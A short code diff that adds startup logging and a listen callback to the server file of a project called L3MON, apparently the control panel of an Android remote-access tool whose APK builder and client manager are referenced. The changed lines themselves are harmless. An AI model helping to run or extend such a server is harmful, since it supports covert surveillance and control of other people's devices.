@@ -16,6 +16,8 @@ const
     clientManager = new (require('./includes/clientManager'))(db),
     apkBuilder = require('./includes/apkBuilder');
 
+console.log('Initializing L3MON...');
+
 global.CONST = CONST;
 global.db = db;
 global.logManager = logManager;
@@ -64,7 +66,10 @@ client_io.on('connection', (socket) => {
 
 
 // get the admin interface online
-app.listen(8080, '0.0.0.0');
+const server = app.listen(8080, '0.0.0.0', () => {
+    console.log('L3MON Server started on port 8080');
+    console.log('Admin interface: http://0.0.0.0:8080');
+});
 
 /* 
 *   
